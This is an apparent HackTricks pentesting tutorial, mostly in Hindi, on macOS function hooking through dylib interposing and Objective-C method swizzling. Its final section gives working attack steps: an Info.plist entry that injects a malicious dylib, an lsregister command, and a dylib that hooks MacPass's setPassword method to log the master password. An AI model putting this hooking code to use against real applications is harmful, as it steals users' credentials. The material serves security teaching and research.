# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

एक **dylib** बनाएं जिसमें एक **`__interpose`** सेक्शन (या एक सेक्शन जिसे **`S_INTERPOSING`** के साथ चिह्नित किया गया हो) हो, जिसमें **function pointers** के ट्यूपल्स हों जो **original** और **replacement** functions को संदर्भित करते हैं।

फिर, **`DYLD_INSERT_LIBRARIES`** के साथ dylib को **inject** करें (interposing मुख्य ऐप लोड होने से पहले होनी चाहिए)। स्पष्ट रूप से [**`DYLD_INSERT_LIBRARIES`** के उपयोग पर लागू **restrictions** यहाँ भी लागू होते हैं](../macos-proces-abuse/macos-library-injection/index.html#check-restrictions)।

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Method Swizzling

In ObjectiveC यह एक विधि को इस तरह से कॉल किया जाता है: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

यह आवश्यक है **object**, **method** और **params**। और जब एक विधि को कॉल किया जाता है, तो एक **msg भेजा जाता है** जो फ़ंक्शन **`objc_msgSend`** का उपयोग करता है: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

ऑब्जेक्ट है **`someObject`**, विधि है **`@selector(method1p1:p2:)`** और तर्क हैं **value1**, **value2**।

ऑब्जेक्ट संरचनाओं के अनुसार, एक **विधियों की सूची** तक पहुँचना संभव है जहाँ **नाम** और **विधि कोड के लिए पॉइंटर्स** **स्थित** होते हैं।

> [!CAUTION]
> ध्यान दें कि चूंकि विधियों और कक्षाओं को उनके नामों के आधार पर एक्सेस किया जाता है, यह जानकारी बाइनरी में संग्रहीत होती है, इसलिए इसे `otool -ov </path/bin>` या [`class-dump </path/bin>`](https://github.com/nygard/class-dump) के साथ पुनः प्राप्त करना संभव है।

### Accessing the raw methods

यह विधियों की जानकारी जैसे नाम, पैरामीटर की संख्या या पता तक पहुँचने के लिए संभव है जैसे कि निम्नलिखित उदाहरण में:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

The function **`method_exchangeImplementations`** allows to **change** the **address** of the **implementation** of **one function for the other**.

> [!CAUTION]
> So when a function is called what is **executed is the other one**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> इस मामले में यदि **वैध** विधि का **कार्यान्वयन कोड** **विधि** **नाम** की **पुष्टि** करता है, तो यह इस स्विज़लिंग का **पता** लगा सकता है और इसे चलने से रोक सकता है।
>
> निम्नलिखित तकनीक में यह प्रतिबंध नहीं है।

### विधि स्विज़लिंग के साथ method_setImplementation

पिछला प्रारूप अजीब है क्योंकि आप एक विधि के कार्यान्वयन को दूसरी से बदल रहे हैं। फ़ंक्शन **`method_setImplementation`** का उपयोग करके आप **एक विधि के कार्यान्वयन को दूसरी के लिए बदल** सकते हैं।

बस याद रखें कि यदि आप इसे नए कार्यान्वयन से कॉल करने जा रहे हैं तो **मूल वाले के कार्यान्वयन का पता** **संग्रहित** करें, क्योंकि इसे ओवरराइट करने से पहले इसे ढूंढना बाद में बहुत जटिल होगा।
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

इस पृष्ठ पर फ़ंक्शनों को हुक करने के विभिन्न तरीकों पर चर्चा की गई। हालाँकि, इसमें **हमले के लिए प्रक्रिया के अंदर कोड चलाना** शामिल था।

यह करने के लिए सबसे आसान तकनीक है [पर्यावरण चर के माध्यम से Dyld को इंजेक्ट करना या हाइजैकिंग](../macos-dyld-hijacking-and-dyld_insert_libraries.md)। हालाँकि, मुझे लगता है कि यह [Dylib प्रक्रिया इंजेक्शन](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) के माध्यम से भी किया जा सकता है।

हालाँकि, दोनों विकल्प **असुरक्षित** बाइनरी/प्रक्रियाओं तक **सीमित** हैं। सीमाओं के बारे में अधिक जानने के लिए प्रत्येक तकनीक की जांच करें।

हालाँकि, एक फ़ंक्शन हुकिंग हमला बहुत विशिष्ट है, एक हमलावर यह करेगा **प्रक्रिया के अंदर से संवेदनशील जानकारी चुराने के लिए** (यदि नहीं, तो आप बस एक प्रक्रिया इंजेक्शन हमला करेंगे)। और यह संवेदनशील जानकारी उपयोगकर्ता द्वारा डाउनलोड किए गए ऐप्स में स्थित हो सकती है जैसे MacPass।

इसलिए हमलावर का वेक्टर या तो एक भेद्यता खोजने या एप्लिकेशन के हस्ताक्षर को हटाने के लिए होगा, **`DYLD_INSERT_LIBRARIES`** env चर को एप्लिकेशन के Info.plist के माध्यम से इंजेक्ट करना, कुछ इस तरह जोड़ना:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
और फिर **पुनः पंजीकरण** करें आवेदन:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
उस पुस्तकालय में हुकिंग कोड जोड़ें ताकि जानकारी को एक्सफिल्ट्रेट किया जा सके: पासवर्ड, संदेश...

> [!CAUTION]
> ध्यान दें कि macOS के नए संस्करणों में यदि आप एप्लिकेशन बाइनरी का **हस्ताक्षर हटा देते हैं** और इसे पहले निष्पादित किया गया था, तो macOS **अब एप्लिकेशन को निष्पादित नहीं करेगा**।

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## संदर्भ

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
